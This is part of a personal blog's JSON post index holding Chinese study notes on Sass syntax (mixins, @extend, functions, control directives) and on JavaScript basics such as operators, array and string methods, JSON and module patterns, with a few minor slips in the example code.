为便于书写，@mixin 可以用 = 表示，而 @include 可以用 + 表示 12345678910111213141516171819202122232425262728293031323334353637383940// 无参数@mixin block &#123; display: block;&#125;// css 规则，注意上下文@mixin no-bullets &#123; list-style: none; li &#123; list-style-image: none; list-style-type: none; margin-left: 0px; &#125;&#125;// 带参数@mixin opacity($opacity: 50) &#123; opacity: $opacity / 100; filter: alpha(opacity=$opacity);&#125;// 多个参数@mixin horizontal-line($border: 1px dashed #ccc, $padding: 10px)&#123; border-bottom: $border; padding-top: $padding; padding-bottom: $padding;&#125;@include horizontal-line($padding: 15px);// 多组值参数@mixin box-shadow($shadow...) &#123; -webkit-box-shadow:$shadow; box-shadow:$shadow;&#125;@include box-shadow( 0 2px 2px rgba(0, 0, 0, 0.3), 0 3px 3px rgba(0, 0, 0, 0.2)); @content@content 它可以使 @mixin 接受一整块样式，接受的样式从 @content 开始。 123456789@mixin max-screen($res) &#123; @media only screen and ( max-width: $res ) &#123; @content; // body &#123; color: red &#125; &#125;&#125;@include max-screen(480px) &#123; body &#123; color: red &#125; // 这里就i @content 引用的内容&#125; 继承选择器继承可以让选择器继承另一个选择器的所有样式，并联合声明。使用选择器的继承，要使用关键词 @extend，后面紧跟需要继承的选择器。继承可以继承默认的元素属性，比如让一个div继承a，那么这 div 看起来就好像 a 一样。 12345678// 继承现有的标签，或类h1&#123; border: 4px solid #ff9aa9;&#125;.speaker&#123; @extend h1; border-width: 2px;&#125; 占位选择器 %可以定义占位选择器 %，如果不调用则不会有任何多余的 css 代码。 1234567%block &#123; display: block;&#125;.box &#123; @extend %block;&#125; 函数sass定义了很多函数可供使用，当然你也可以自己定义函数，以@fuction开始。 使用最多的是颜色函数：颜色函数中又以 lighten 减淡和 darken 加深为最，其调用方法为 lighten($color, $amount) 和 darken($color, $amount)它们的第一个参数都是颜色值，第二个参数都是百分比。 12345678910@function pxToRem($px) &#123; @return $px / $baseFontSize * 1rem;&#125;body &#123; color: lighten($gray, 10%); // 直接使用&#125;div &#123; font-size: pxToRem(16px); color: darken($gray, 10%);&#125; @if 判断@if 可一个条件单独使用，也可以和 @else 结合多条件使用 123456789$big: false;p &#123; @if $big == false &#123; margin: 10px; &#125; @else &#123; margin: 10px auto; &#125;&#125; 三目判断语法为：if($condition, $if_true, $if_false) 。三个参数分别表示：条件，条件为真的值，条件为假的值。 12345$min: 20;p &#123; color: if($min &gt; 10, red, blue); // blue&#125; for 循环for 循环有两种形式，分别为：@for $var from [start] through [end] 和 @for $var from [start] to [end]。关键字through表示包括end这个数，而to则不包括end这个数。 123@for $i from 1 through 3 &#123; .item-#&#123;$i&#125; &#123; width: 2em * $i; &#125;&#125; @each 循环语法为：@each $var in [list or map] 123456$headings: (h1: 2em, h2: 1.5em, h3: 1.2em);@each $header, $size in $headings &#123; #&#123;$header&#125; &#123; font-size: $size; &#125;&#125;","categories":[{"name":"Sass","slug":"Sass","permalink":"http://me.lizhooh.com/categories/Sass/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"Sass","slug":"Sass","permalink":"http://me.lizhooh.com/tags/Sass/"}]},{"title":"JavaScript 知识整理","slug":"Javascript/JavaScript 知识整理","date":"2016-01-06T11:41:53.000Z","updated":"2021-06-15T06:10:52.824Z","comments":true,"path":"/stories/2016/01/Javascript/JavaScript 知识整理/","link":"","permalink":"http://me.lizhooh.com/stories/2016/01/Javascript/JavaScript 知识整理/","excerpt":"对象的引用如果不同的变量名指向同一个对象，那么它们都是这个对象的引用，也就是说指向同一个内存地址。修改其中一个变量，会影响到其他所有变量。 1234567var o1 = &#123;&#125;;o1.a = 1;o2.a // 1o2.b = 2;o1.b // 2","text":"对象的引用如果不同的变量名指向同一个对象，那么它们都是这个对象的引用，也就是说指向同一个内存地址。修改其中一个变量，会影响到其他所有变量。 1234567var o1 = &#123;&#125;;o1.a = 1;o2.a // 1o2.b = 2;o1.b // 2 表达式还是语句？对象采用大括号表示，这导致了一个问题：如果行首是一个大括号，它到底是表达式还是语句？ 1&#123; foo: 123 &#125; 为了避免这种歧义，JavaScript规定，如果行首是大括号，一律解释为语句（即代码块）。如果要解释为表达式（即对象），必须在大括号前加上圆括号。 1(&#123; foo: 123&#125;) 利用这个特定就引出了一种模式：初始化模式下面创建一个对象，并使用了它的初始化函数，返回自身的引用，这个init就好像构造函数一样 12345678910var user = (&#123; // ... name: '', init: function(name) &#123; this.name = name; return this; &#125;&#125;).init('xiaoming');console.log(user.name); // 'xiaoming' 检查变量是否声明如果读取一个不存在的键，会返回undefined，而不是报错。可以利用这一点，来检查一个全局变量是否被声明。后二种写法有漏洞，如果a属性是一个空字符串（或其他对应的布尔值为false的情况），则无法起到检查变量是否声明的作用。最好的方法是使用in 12345678910// 假设变量x未定义// 写法一：报错if (x) &#123; return 1; &#125;// 写法二：不正确if (window.x) &#123; return 1; &#125;// 写法三：正确if ('x' in window) &#123; return 1; &#125; 判断对象的实例可以使用instanceof判断变量是否属于某个对象的实例。 123var oStringObject = new String(\"hello world\");console.log(oStringObject instanceof String); // 输出 \"true\"new Object(123) instanceof Number; // true 构造函数一旦没有使用 new ，内部的this就指向全局空间，可以使用instanceof来帮助没有使用 new 的情况 12345678910var Person = function(name) &#123; if(!(this instanceof Person)) &#123; return new Person(name); &#125; this.name = name;&#125;;var p = Person('xiaoming');console.log(p.name); // 'xiaoming' 查看所有属性查看一个对象本身的所有属性，可以使用 Object.keys 方法。 123456var o = &#123; key1: 1, key2: 2&#125;;Object.keys(o); // [key1, key2] 布尔值布尔值代表“真”和“假”两个状态。如果JavaScript预期某个位置应该是布尔值，会将该位置上现有的值自动转为布尔值。转换规则是除了下面六个值被转为false，其他值都视为true。 123456undefinednullfalse0NaN\"\"或''（空字符串） 注意：布尔值的自动转换陷阱。 123456789if ([]) &#123; console.log(true);&#125;// trueif (&#123;&#125;) &#123; console.log(true);&#125;// true 余数运算符余数运算符（%）返回前一个运算子被后一个运算子除，所得的余数。需要注意的是，运算结果的正负号由第一个运算子的正负号决定。 12345678910111213141516-1 % 2; // -11 % -2; // 1// 错误的写法function isOdd(n) &#123; return n % 2 === 1;&#125;isOdd(-5) // falseisOdd(-4) // false// 正确的写法function isOdd(n) &#123; return Math.abs(n % 2) === 1;&#125;isOdd(-5) // trueisOdd(-4) // false 比较运算符比较运算符可以比较各种类型的值，不仅仅是数值。 如果两个运算子都是字符串，则按照字典顺序比较（实际上是比较Unicode码点）。 否则，将两个运算子都转成数值，再进行比较（等同于先调用Number函数）。 12345678910111213141516175 &gt; '4' // true// 等同于 5 &gt; Number('4')// 即 5 &gt; 4true &gt; false // true// 等同于 Number(true) &gt; Number(false)// 即 1 &gt; 02 &gt; true // true// 等同于 2 &gt; Number(true)// 即 2 &gt; 1[2] &gt; [1] // true// 等同于 [2].valueOf().toString() &gt; [2].valueOf().toString()&#123;x: 2&#125; &gt;= &#123;x: 1&#125; // true// 等同于 &#123;x: 2&#125;.valueOf().toString() &gt;= &#123;x: 1&#125;.valueOf().toString() 且运算符（&amp;&amp;）且运算符的运算规则是：如果第一个运算子的布尔值为true，则返回第二个运算子的值（注意是值，不是布尔值）；如果第一个运算子的布尔值为false，则直接返回第一个运算子的值，且不再对第二个运算子求值。 12345678't' &amp;&amp; (1 + 2) // 3'' &amp;&amp; 'f' // ''if (i) &#123; doSomething();&#125;// 等价于i &amp;&amp; doSomething(); 或运算符（||）或运算符（||）的运算规则是：如果第一个运算子的布尔值为true，则返回第一个运算子的值，且不再对第二个运算子求值；如果第一个运算子的布尔值为false，则返回第二个运算子的值。 123456789false || 0 || '' || 4 || 'foo' || true// 4function saveText(text) &#123; text = text || ''; // ...&#125;// 或者写成saveText(this.text || '') 运算符位运算符只对整数起作用，如果一个运算子不是整数，会自动转为整数后再执行。利用这个特性，可以写出一个函数，将任意数值转为32位整数。 123456789101112131.23324 | 0; // 1~~2.9; // 21.9999 &amp; 1; // 1^3.231 ^ 0; // 3function toInt32(x) &#123; return x | 0;&#125;toInt32(1.001) // 1toInt32(1.999) // 1toInt32(1) // 1toInt32(Math.pow(2, 32) + 1) // 1 多行字符串如果长字符串必须分成多行，可以在每一行的尾部使用反斜杠。 12345678910111213141516171819var longString = \"Long \\long \\long \\string\";longString// \"Long long long string\"// 利用多行注释的变通方法。(function () &#123;/*line 1line 2line 3*/&#125;).toString().split('\\n').slice(1, -1).join('\\n');// slice(1, -1) 去除 /**///\"line 1// line 2// line 3\" 不变字符串字符串内部的单个字符无法改变和增删，这些操作会默默地失败。 12345678910var s = 'hello';delete s[0];s // \"hello\"s[1] = 'a';s // \"hello\"s[5] = '!';s // \"hello\" 使用对象结构代替 switch…caseswitch…case不使用大括号，不利于代码形式的统一。此外，这种结构类似于goto语句，容易造成程序流程的混乱，使得代码结构混乱不堪，不符合面向对象编程的原则。 123456789101112131415161718192021222324252627282930// 反模式function doAction(action) &#123; switch (action) &#123; case 'hack': // ... break; case 'slash': // ... break; default: throw new Error('Invalid action.'); &#125;&#125;// 好模式function doAction(action) &#123; var actions = &#123; hack: function () &#123; // ... &#125;, slash: function () &#123; // ... &#125;, &#125;; if (typeof actions[action] !== 'function') &#123; throw new Error('Invalid action.'); &#125; return actions[action]();&#125; Object.prototype.toStringObject.prototype.toString方法返回对象的类型字符串，因此可以用来判断一个值的类型。 123456789var toString = Object.prototype.toString;toString.call(2); // \"[object Number]\"toString.call(''); // \"[object String]\"toString.call(true); // \"[object Boolean]\"toString.call(undefined); // \"[object Undefined]\"toString.call(null); // \"[object Null]\"toString.call(Math); // \"[object Math]\"toString.call(&#123;&#125;); // \"[object Object]\"toString.call([]); // \"[object Array]\" 数组 concat()concat方法用于多个数组的合并。它将新数组的成员，添加到原数组的尾部，然后返回一个新数组，原数组不变。 1234['hello'].concat(['world']);// [\"hello\", \"world\"][1, 2, 3].concat(4, 5, 6);// [1, 2, 3, 4, 5, 6] 数组 reverse()reverse方法用于颠倒数组中元素的顺序，返回改变后的数组。注意，该方法将改变原数组。 12var a = ['a', 'b', 'c'];a.reverse(); // [\"c\", \"b\", \"a\"] 数组 splice()splice方法用于删除原数组的一部分成员，并可以在被删除的位置添加入新的数组成员，返回值是被删除的元素。注意，该方法会改变原数组。 splice的第一个参数是删除的起始位置，第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素。 1234567// 格式arr.splice(index, count_to_remove, addElement1, addElement2, ...);// 用法var a = ['a', 'b', 'c', 'd', 'e', 'f'];a.splice(4, 2); // [\"e\", \"f\"]a; // [\"a\", \"b\", \"c\", \"d\"] 数组 sort()sort方法对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。 12345['d', 'c', 'b', 'a'].sort()// ['a', 'b', 'c', 'd'][4, 3, 2, 1].sort()// [1, 2, 3, 4] 如果想让sort方法按照自定义方式排序，可以传入一个函数作为参数，表示按照自定义方法进行排序。该函数本身又接受两个参数，表示进行比较的两个元素。如果返回值大于0（降排序），表示第一个元素排在第二个元素后面；其他情况下，都是第一个元素排在第二个元素前面。 1234[10111, 1101, 111].sort(function (a, b) &#123; return a - b;&#125;)// [111, 1101, 10111] 数组 map()map方法对数组的所有成员依次调用一个函数，根据函数结果返回一个新数组。与forEach不同的是，forEach一般只作遍历使用。 123456789var numbers = [1, 2, 3];numbers.map(function (n, index, list) &#123; return n + 1;&#125;);// [2, 3, 4]numbers;// [1, 2, 3] 数组 filter()filter方法的参数是一个函数，所有数组成员依次执行该函数，返回结果为true的成员组成一个新数组返回。该方法不会改变原数组。 1234[1, 2, 3, 4, 5].filter(function (elem, index, arr) &#123; return (elem &gt; 3);&#125;, this);// [4, 5] 获取非 undefined, null, false, 0, NaN 的数组元素 1234[1, undefined, 2, null].filter(e =&gt; e);// [1, 2][1, false, 2, true, 0, NaN].filter(e =&gt; e);// [1, 2, true] 数组 indexOf()，lastIndexOf()indexOf方法返回给定元素在数组中第一次出现的位置，如果没有出现则返回-1。lastIndexOf方法返回给定元素在数组中最后一次出现的位置，如果没有出现则返回-1。 12345var a = ['a', 'b', 'c', 'c'];a.indexOf('b'); // 1a.indexOf('y', 1); // 从a[1]开始a.lastIndexOf('c'); // 3 JSON.stringify()JSON.stringify方法用于将一个值转为字符串。该字符串应该符合JSON格式，并且可以被JSON.parse方法还原。 12JSON.stringify(&#123; name: \"张三\", age: 20 &#125;);// '&#123;\"name\":\"张三\", \"age\": \"20\"&#125;' JSON.stringify还可以接受第三个参数，用于增加返回的JSON字符串的可读性。 1234567JSON.stringify(&#123; p1: 1, p2: 2 &#125;, null, 4);/*\"&#123; \"p1\": 1, \"p2\": 2&#125;\"*/ JSON.parse()JSON.parse方法用于将JSON字符串转化成对象。 12var o = JSON.parse('&#123;\"name\": \"张三\"&#125;');o.name; // 张三 Math 对象方法 Math.abs()：绝对值Math.ceil()：向上取整Math.floor()：向下取整Math.max()：最大值Math.min()：最小值Math.pow()：指数运算Math.sqrt()：平方根Math.log()：自然对数Math.exp()：e的指数Math.round()：四舍五入Math.random()：随机数Math.sin()：返回参数的正弦Math.cos()：返回参数的余弦Math.tan()：返回参数的正切Math.asin()：返回参数的反正弦（弧度值）Math.acos()：返回参数的反余弦（弧度值）Math.atan()：返回参数的反正切（弧度值） 字符串 toLowerCase()，toUpperCase()toLowerCase方法用于将一个字符串全部转为小写，toUpperCase则是全部转为大写。它们都返回一个新字符串，不改变原字符串。 12345'Hello World'.toLowerCase();// \"hello world\"'Hello World'.toUpperCase();// \"HELLO WORLD\" 字符串 replace()replace方法用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有g修饰符的正则表达式）。 1'aaa'.replace('a', 'b'); // \"baa\" 字符串 split()split方法按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组。 12'a|b|c'.split('|'); // [\"a\", \"b\", \"c\"]'a|b|c'.split('|', 1); // [\"a\"] 封装私有变量：构造函数我们可以利用构造函数，封装私有变量。 1234567891011function StringBuilder() &#123; var buffer = []; this.add = function (str) &#123; buffer.push(str); &#125;; this.toString = function () &#123; return buffer.join(''); &#125;;&#125; 这种方法将私有变量封装在构造函数中，违反了构造函数与实例对象相分离的原则。并且，非常耗费内存。 12345678910111213function StringBuilder() &#123; this._buffer = [];&#125;StringBuilder.prototype = &#123; constructor: StringBuilder, add: function (str) &#123; this._buffer.push(str); &#125;, toString: function () &#123; return this._buffer.join(''); &#125;&#125;; 静态变量公有静态成员 12345// 构造函数var Gadget = function() &#123;&#125;;// 公有静态变量Gadget.say = function() &#123;&#125;; 私有静态成员，需要使用闭包来实现 123456789101112var Gadget = (function() &#123; // 私有静态变量 var counter = 0; // 返回一个构造函数 return function() &#123; console.log(counter += 1); &#125;;&#125;)();var g1 = new Gadget(); // 1var g2 = new Gadget(); // 2 模块空间独立性是模块的重要特点，模块内部最好不与程序的其他部分直接交互。为了在模块内部调用全局变量，必须显式地将其他变量输入模块。 1234567891011121314151617(function($, window, document) &#123; function go(num) &#123;&#125; function handleEvents() &#123;&#125; function initialize() &#123;&#125; function dieCarouselDie() &#123;&#125; // attach to the global scope window.finalCarousel = &#123; init : initialize, destroy : dieCouraselDie &#125;&#125;)(jQuery, window, document); 参考资料 http://javascript.ruanyifeng.com/","categories":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/categories/Javascript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"}]}]}